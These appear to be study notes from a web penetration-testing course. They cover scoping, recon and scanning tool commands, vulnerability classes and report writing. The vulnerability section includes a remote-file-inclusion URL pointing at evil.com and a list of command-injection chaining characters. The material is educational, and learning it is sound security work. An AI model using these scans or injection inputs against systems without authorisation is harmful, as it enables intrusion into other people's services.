### Web Application Penetration Testing
#### Notes from AJ Dumanhug's course

##### Introduction - 
Web application penetration testing (`WAPT`) mimics real-world attacks on web applications using tools and techniques commonly used by cyber criminals.

It includes a high degree of concern about - 

1. Requirement for a regulatory compliance.
2. Pass a vendor assessment.
3. Significant changes to business processes or applications.
4. Discovery of new vulnerabilities.

Types of penetration testing - 

1. Black box - Zero knowledge
2. Gray box - Some knowledge
3. White box - Full knowledge

Three phases in penetration testing - 

1. Pre-attack phase - Scoping & reconaissance.
2. Attack phase - Scanning & exploitation.
3. Post-attack phase - Risk analysis & report writing.


##### Pre-attack phase - 

###### Scoping - 

1. Understand why the client wants to conduct a pentest.
2. Determine which assets must be tested & how many assets.
3. Discuss the rules for the pentest activity.

###### Rules of Engagement - 
It includes -

1. Permissions
2. Test scope
3. Rules.

###### Reconaissance 
Collecting information about the target that can later be used for attack.

1. `Passive Reconaissance` - 
	1. Collecting information without interacting with the target.
	2. Gathered using public resource (OSINT)
2. `Active Reconaissance` - 
	1. Collecting information by directly interacting with the target.
	2. Using different tools.

[List of recon workflows from various hackers](https://pentester.land/cheatsheets/2019/03/25/compilation-of-recon-workflows.html)

###### Asset discovery - 
It is the process of keeping track of all active and inactive web application assets.

1. `Whoxy` - It is a domain search engine that is widely used for querying databases that store the registered user of an internet resource such as domain name.
	1. Link - [Whoxy](https://www.whoxy.com)
2. `Google Advanced Search` - It uses special search operators to narrow down the search results. We can use this to enumerate the subdomains of target asset's domain.
	1. `site:.tesla.com` - search for assets that Google has found under `tesla.com`.
	2. `site:.tesla.com -www` - removes result for `www`.
3. `Shodan` -  It is a search engine that lets us find specific types of computers connected to the internet using a variety of filters.
	1. Link - [Shodan](https://www.shodan.io)
	2. `ssl.cert.subject.cn:facebook.com` - search for assets with SSL certificates where the CNAME is under `facebook.com`.
	3. `net:31.13.72.0/24` - search for assets owned by target using their netblock.
	4. `org:"Facebook"` - search for assets owned by specific organisations.
4. `Autonomous Number System (ASN)` - 
	1. Find one IP address belonging to the target. `dig target.com`.
	2. Look up for the ASN on [hackertarget](https://hackertarget.com/as-ip-lookup)
	3. Go to shodan and use the filter - `asn:AS#####`.
5. `Cloudflare` - It is one of the biggest networks operating on the internet. It is used for the purposes of increasing the security and performance of websites.
	1. Link - [Cloudflare](https://www.cloudflare.com)
6. `Certificate Transparency` - 
	1. [https://crt.sh/](https://crt.sh/)
	2. [https://developers.facebook.com/tools/ct/search](https://developers.facebook.com/tools/ct/search)
7. `subfinder` - 
	1. Link - [Subfinder](https://github.com/projectdiscovery/subfinder)
	2. `subfinder -d target.com`
	3. `subfinder -d target.com -recursive`


###### Content discovery - 
It is the process of identifying resources in a specific asset.

1. `httpx` - probes for HTTP/HTTPS sites.
	1. Link - [Httpx](https://github.com/projectdiscovery/httpx)
	2. `httpx -list assets.txt -title -tech-detect -status-code`
	3. `subfinder -d target.com -silent | httpx -title -tech-detect -status-code`
	4. `echo 209.133.79.0/24 | httpx -title -tech-detect -status-code`
2. `Aquatone` - visual inspection of websites across a large number of targets.
	1. Link - [Aquatone](https://github.com/michenriksen/aquatone)
	2. `cat assets.txt | aquatone`
3. `Technology profiling` - Finding technologies used in a target asset.
	1. [Builtwith](https://builtwith.com)
	2. [Wappalyzer](https://www.wappalyzer.com)
4. `Fuzzing with ffuf` - For web enumeration, fuzzing and directory brute forcing.
	1. `ffuf -u http://target.com/FUZZ -c -w wordlist.txt`
	2. `ffuf -u http://target.com/FUZZ -c -w wordlist.txt -e .php`
	3. `ffuf -u http://target.com/showimg.php?FUZZ=test -c -w wordlist.txt -fw 2`
5. `URL extraction using gau` - `Gau` fetches known urls from AlienVault's Open Threat Exchange, the wayback machine and Common crawl for a given domain.
	1. Link - [Gau](https://github.com/lc/gau)
	2. `gau target.com`
	3. `gau target.com | grep -i ".php"`
6. `Endpoint extraction using linkfinder` - `Linkfinder` is a python script to discover endpoints and their parameters in `JS` files.
	1. Link - [Linkfinder](https://github.com/GerbenJavado/LinkFinder)
	2. `python3 linkfinder.py -i https://target.com/main.js`
7. `Parameter discovery using ParamSpider` - A python script to discover parameters in a target domain/asset.
	1. Link - [ParamSpider](https://github.com/devanshbatham/ParamSpider)
	2. `python3 paramspider.py --domain target.com`


##### Attack Phase - 

###### Open source scanners - 

1. `WPScan` - It is used to scan remote Wordpress installations to find security issues.
	1. Vulnerable wordpress application - [DVWP](https://github.com/vavkamil/dvwp)
	2. `wpscan --url http://target.com`
2. `Joomscan/Juumla` - Automates the task of vulnerability detection and reliability assurance in Joomla CMS deployments.
	1. Link for Juumla - [Juumla](https://github.com/oppsec/juumla)
	2. `joomscan -u http://target.com`
3. `Droopescan` - Identifies security issues in Drupal installations. 
	1. Link - [Droopescan](https://github.com/SamJoan/droopescan)
	2. `./droopescan scan drupal -u http://target.com`
4. `CMSeeK` - Scanning wordpress, drupal, joomla and over 180 other CMSs.
	1. Link - [CMSeeK](https://github.com/Tuhinshubhra/CMSeek)
	2. `python3 cmseek.py -u http://target.com`
5. `Nuclei` - Fast and customised community powered vulnerability scanner.
	1. Link - [Nuclei](https://github.com/projectdiscovery/nuclei/releases)
	2. `nuclei -u https://target.com`
	3. `nuclei -u https://target.com -t exposures` - custom template directory
	4. `nuclei -u https://target.com --tags cve` - filters
	5. `nuclei -u https://target.com -w workflows/wordpress-workflow.yaml -severity critical,high,medium,low` - workflow with filters.
6. `Burpsuite` - Standard tool for testing the security of web application.
	1. [Burpsuite testing methodology](https://portswigger.net/support/burp-testing-methodologies)

###### Vulnerabilities - 

1. `Domain/Subdomain takeover` - Occurs when DNS entry for a domain/subdomain is pointing to an external service that has been removed or not currently in use.
	1. [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz)
2. `Path traversal & Local File Inclusion (LFI)` - 
	1. Path traversal - Access files and directories that are stored outside the web root directory by traversing the path with dot-dot-slash sequences (`../`).
	2. LFI - Allows an attacker to include a local file on the server through the exploitation of vulnerable inclusion procedures implemented in the application.
	3. [Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
3. `Remote File Inclusion (RFI)` - Allows an attacker to include an external link or file on the target application.
	1. `http://target.com/?location=http://evil.com`
4. `OS command injection` - Allows an attacker to execute operating system commands on the target application.
	1. Chaining characters -`&, &&, |, ||, ;, %0A, $(cmd)` \`cmd\`
	2. [Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
5. `Cross-site scripting (XSS)` - Allows an attacker to run malicious `Javascript` in the application.
	1. Reflected XSS
	2. Stored XSS
	3. DOM-based XSS
	4. [Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
6. `SQL injection` - Allows an attacker to insert or inject a malicious query that are later passed to an SQL query for parsing and execution.
	1. [Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
	2. Error-based SQLi
	3. UNION-based SQLi
	4. Time-based SQLi
	5. Boolean-based SQLi
	6. Tool - `SQLmap`
7. `Exposed git repository` - Git repository or `.git` is a folder containing all the information about the commits, logs, source code etc.
	1. Tools - [Dotgit](https://github.com/davtur19/DotGit) and [GitTools](https://github.com/internetwache/GitTools)
8. `Information exposure` - Depending on context, target application may leak information to anyone on the internet including - 
	1. Sensitive personal information or personal information about users (exposed SQL database backup)
	2. Technical data about website application.
	3. Database credentials and API keys about the website.
	4. Common sources of information exposures - 
		1. Files for web crawlers such as `/robots.txt`, `/sitemap.xml`
		2. Enabled directory listing.
		3. Error messages.
		4. Debug.
		5. Backup and log files.
		6. Public source code.
	5. [GHDB](https://www.exploit-db.com/google-hacking-database) and [Github dorks](https://github.com/techgaun/github-dorks)
9. `Brute force` - An attacker uses a system of trial and error in an attempt to guess valid user credentials.
10. `Unrestricted file upload` - Occurs in web application where an attacker uploads a malicious file to run some code to access the server.
	1. [Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
11. `Insecure Direct Object Reference (IDOR)` - It allows an attacker to change the value of a parameter which leads to unauthorized access, modification or deletion of a resource.
12. `XML External Entities (XML)` - Abuses features of XML parsers.
	1. Retrieve files.
	2. Perform SSRF.
	3. Denial-of-Service.
	4. [Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
13. `Server side request forgery (SSRF)` - Allows an attacker to send a server-side request with the help of the vulnerable application.
	1. [Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
14. `Server side template injection (SSTI)` - An attacker injects malicious input into a template used by the web application to execute commands on the server.
	1. [Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)


##### Post-attack phase - 

###### Severity levels - 
Helps decide which vulnerabilities should be fixed first.

1. `Common Vulnerability Scoring System (CVSS)` - Open framework for communicating the characteristics and severity of security vulnerabilities.
	1. [CVSS Calculator](https://www.first.org/cvss/calculator/3.1)
2. `Penetration testing report writing` - 
	1. [Repository of pentest reports](https://github.com/juliocesarfort/public-pentesting-reports)


